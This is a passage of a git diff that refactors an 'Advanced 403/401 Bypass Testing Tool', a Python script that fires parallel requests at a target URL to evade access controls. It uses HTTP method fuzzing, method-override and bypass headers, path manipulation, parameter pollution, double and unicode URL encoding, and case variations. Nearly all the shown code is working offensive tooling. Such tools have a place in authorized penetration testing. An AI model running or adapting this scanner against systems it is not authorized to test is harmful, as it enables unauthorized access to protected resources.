+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        futures = [ex.submit(test_fuzzing, target_url, eff_path, mth, None, custom_headers, verbose)
+                   for mth in HTTP_METHODS if not any(c.isspace() for c in mth)]
+        for f in futures:
+            try:
+                s, code, m, h, p = f.result()
+                if s:
+                    print_status(target_url, code, m, h, p)
+            except Exception:
+                pass
+
+    # 7. Method override
+    if eff_path:
+        if verbose:
+            print(f"\n{colors.BOLD}[*] Phase 7/9: Method override{colors.END}")
+        s, code, m, h, p = test_method_override(target_url, eff_path, custom_headers, verbose)
+        if s:
+            print_status(target_url, code, m, h, p, extra_note="Method override header")
+
+    # 8. Header bypass
+    if verbose:
+        print(f"\n{colors.BOLD}[*] Phase 8/9: Header bypass{colors.END}")
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        futures = [ex.submit(test_fuzzing, target_url, eff_path, "GET", header.copy(), custom_headers, verbose)
+                   for header in BYPASS_HEADERS]
+        for f in futures:
+            try:
+                s, code, _, h, p = f.result()
+                if s:
+                    print_status(target_url, code, "GET", h, p)
+            except Exception:
+                pass
+
+    # 9. Path/encoding/case (parallel mega-phase)
+    if eff_path:
+        if verbose:
+            print(f"\n{colors.BOLD}[*] Phase 9/9: Path / encoding / case (parallel){colors.END}")
+
+        eff = eff_path.lstrip('/')
+        base_url = target_url.rstrip('/')
+        phase_jobs = []  # (label, full_url, display_path)
+
+        # Path manipulation techniques
+        for technique in PATH_MANIPULATION_TECHNIQUES:
+            try:
+                modified = technique.format(eff)
+                if not modified.startswith('/'):
+                    modified = f"/{modified}"
+                phase_jobs.append(("path", format_url(target_url, modified), modified))
+            except (IndexError, KeyError):
                 continue
 
-            futures.append(executor.submit(test_fuzzing, target_url, effective_path, method, None, custom_headers, verbose))
+        # Parameter pollution
+        for technique in PARAMETER_TECHNIQUES:
+            phase_jobs.append(("param", f"{base_url}/{eff}{technique}", f"{eff}{technique}"))
 
-        for future in futures:
-            try:
-                success, code, method, headers, path = future.result()
-                if success:
-                    print_status(target_url, code, method, headers, path)
-            except Exception as e:
-                if verbose:
-                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")
+        # Encoding templates
+        for tpl in ENCODING_TEMPLATES:
+            encoded = tpl.format(eff)
+            phase_jobs.append(("enc", format_url(target_url, encoded), encoded))
 
-    # Test Header Bypass Techniques
-    if verbose:
-        print(f"\n{colors.BOLD}[*] Testing Header Bypass Techniques{colors.END}")
+        # Char-by-char encoding: %hex (single), %25hex (double), %5cu00hex (\uXXXX)
+        for i, ch in enumerate(eff):
+            if not ch.isalnum():
+                continue
+            hex_l = format(ord(ch), '02x')
+            hex_u = hex_l.upper()
+            for variant in (
+                eff[:i] + f"%{hex_l}" + eff[i+1:],
+                eff[:i] + f"%{hex_u}" + eff[i+1:],
+                eff[:i] + f"%25{hex_l}" + eff[i+1:],
+                eff[:i] + f"%25{hex_u}" + eff[i+1:],
+                # \u escape (literal %5cu00XX in the path)
+                eff[:i] + f"%5cu00{hex_l}" + eff[i+1:],
+                eff[:i] + f"%5cu00{hex_u}" + eff[i+1:],
+                eff[:i] + f"\\u00{hex_l}" + eff[i+1:],
+            ):
+                phase_jobs.append(("char", format_url(target_url, variant), variant))
 
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = []
-        for header in BYPASS_HEADERS:
-            h = header.copy()
-            futures.append(executor.submit(test_fuzzing, target_url, effective_path, "GET", h, custom_headers, verbose))
+        # Case variations
+        case_variants = {
+            eff.upper(),
+            eff.lower(),
+            eff.capitalize(),
+            eff.swapcase(),
+            ''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(eff)),
+        }
+        case_variants.discard(eff)
+        for variant in case_variants:
+            phase_jobs.append(("case", format_url(target_url, variant), variant))
 
-        for future in futures:
-            try:
-                success, code, _, headers, path = future.result()
-                if success:
-                    print_status(target_url, code, "GET", headers, path)
-            except Exception as e:
-                if verbose:
-                    print(f"{colors.RED}    Error processing result: {e}{colors.END}")
+        notes = {
+            "path": "Path manipulation",
+            "param": "Parameter pollution",
+            "enc": "Encoding template",
+            "char": "Char-by-char URL encoding",
+            "case": "Case variation",
+        }
 
-    # Test Path Manipulation Techniques
-    if effective_path:
-        if verbose:
-            print(f"\n{colors.BOLD}[*] Testing Path Manipulation Techniques{colors.END}")
+        def _job(label, url_, display_path):
+            h = {"User-Agent": random_user_agent()}
+            if custom_headers:
+                h.update(custom_headers)
+            if verbose:
+                print(f"{colors.BLUE}[*] [{label}] GET {url_}{colors.END}")
+            r = safe_request("GET", url_, h, verbose=verbose)
+            if is_bypass(eff_path, r):
+                return label, r.status_code, h, display_path
+            return None
 
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = []
-            for technique in PATH_MANIPULATION_TECHNIQUES:
+        with ThreadPoolExecutor(max_workers=threads) as ex:
+            futures = [ex.submit(_job, *job) for job in phase_jobs]
+            for f in futures:
                 try:
-                    if technique == "{0}/ ".upper():
-                        modified_path = technique.format(effective_path.upper())
-                    else:
-                        modified_path = technique.format(effective_path)
+                    res = f.result()
+                    if res:
+                        label, code, h, display = res
+                        print_status(target_url, code, "GET", h, display, extra_note=notes[label])
+                except Exception:
+                    pass
 
-                    if not modified_path.startswith('/'):
-                        modified_path = f"/{modified_path}"
-
-                    if verbose:
-                        print(f"{colors.BLUE}[*] Testing path: {format_url(target_url, modified_path)}{colors.END}")
-
-                    futures.append(executor.submit(test_fuzzing, target_url, modified_path, "GET", None, custom_headers, verbose))
-                except (IndexError, KeyError) as e:
-                    if verbose:
-                        print(f"{colors.RED}    Error applying technique {technique}: {e}{colors.END}")
-                    continue
-
-            for future in futures:
-                try:
-                    success, code, _, _, path = future.result()
-                    if success:
-                        print_status(target_url, code, "GET", None, path)
-                except Exception as e:
-                    if verbose:
-                        print(f"{colors.RED}    Error processing result: {e}{colors.END}")
-
-    # Test Parameter Pollution Techniques
-    if effective_path:
-        if verbose:
-            print(f"\n{colors.BOLD}[*] Testing Parameter Pollution Techniques{colors.END}")
-
-        success, code, method, headers, path = test_parameter_pollution(target_url, effective_path, custom_headers, verbose)
-        if success:
-            print_status(target_url, code, method, headers, path)
-
-    # Test Encoding Techniques
-    if effective_path:
-        if verbose:
-            print(f"\n{colors.BOLD}[*] Testing Encoding Techniques{colors.END}")
-
-        success, code, method, headers, path = test_encoding_techniques(target_url, effective_path, custom_headers, verbose)
-        if success:
-            print_status(target_url, code, method, headers, path)
-
+# ---------------------------------------------------------------------------
+# Main
+# ---------------------------------------------------------------------------
 def main():
     parser = argparse.ArgumentParser(description='Advanced 403/401 Bypass Testing Tool')
     parser.add_argument('url', help='Target URL')
-    parser.add_argument('paths', nargs='?', default=None, help='Paths to test (comma-separated, default: root path)')
-    parser.add_argument('-w', '--wordlist', help='Wordlist file containing paths to test')
-    parser.add_argument('-H', '--header', action='append', dest='headers', 
-                        help='Custom HTTP header (format: "Header: Value"). Can be used multiple times.')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
-    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads')
-
+    parser.add_argument('paths', nargs='?', default=None, help='Paths to test (comma-separated)')
+    parser.add_argument('-w', '--wordlist', help='Wordlist of paths')
+    parser.add_argument('-H', '--header', action='append', dest='headers',
+                        help='Custom HTTP header "Header: Value" (repeatable)')
+    parser.add_argument('-v', '--verbose', action='store_true')
+    parser.add_argument('-t', '--threads', type=int, default=20)
+    parser.add_argument('-o', '--output', help='Save findings to JSON file')
     args = parser.parse_args()
 
     if not args.url.startswith(('http://', 'https://')):
         args.url = f'https://{args.url}'
-
     target_url = args.url.rstrip('/')
 
-    # Parse custom headers
     custom_headers = parse_custom_headers(args.headers)
     if custom_headers and args.verbose:
-        print(f"{colors.BLUE}[*] Custom headers loaded:{colors.END}")
+        print(f"{colors.BLUE}[*] Custom headers:{colors.END}")
         for k, v in custom_headers.items():
             print(f"  {k}: {v}")
 
     if args.wordlist:
         paths = load_wordlist(args.wordlist)
-        if args.verbose:
-            print(f"{colors.BLUE}[*] Testing {len(paths)} paths from wordlist{colors.END}")
-
         for path in paths:
             if args.verbose:
-                print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
+                print(f"\n{colors.BOLD}[*] Path: {path}{colors.END}")
+            run_tests(target_url, path, custom_headers, args.threads, args.verbose)
+    elif args.paths:
+        for path in [p.strip() for p in args.paths.split(',')]:
+            if args.verbose:
+                print(f"\n{colors.BOLD}[*] Path: {path}{colors.END}")
             run_tests(target_url, path, custom_headers, args.threads, args.verbose)
     else:
-        if args.paths:
-            paths = [p.strip() for p in args.paths.split(',')]
-            for path in paths:
-                if args.verbose:
-                    print(f"\n{colors.BOLD}[*] Testing path: {path}{colors.END}")
-                run_tests(target_url, path, custom_headers, args.threads, args.verbose)
-        else:
-            run_tests(target_url, None, custom_headers, args.threads, args.verbose)
+        run_tests(target_url, None, custom_headers, args.threads, args.verbose)
+
+    if args.output:
+        with open(args.output, 'w') as f:
+            json.dump(RESULTS, f, indent=2)
+        print(f"\n{colors.GREEN}[+] {len(RESULTS)} finding(s) saved to {args.output}{colors.END}")
+    else:
+        print(f"\n{colors.BOLD}[*] Total findings: {len(RESULTS)}{colors.END}")
 
 if __name__ == "__main__":
     main()
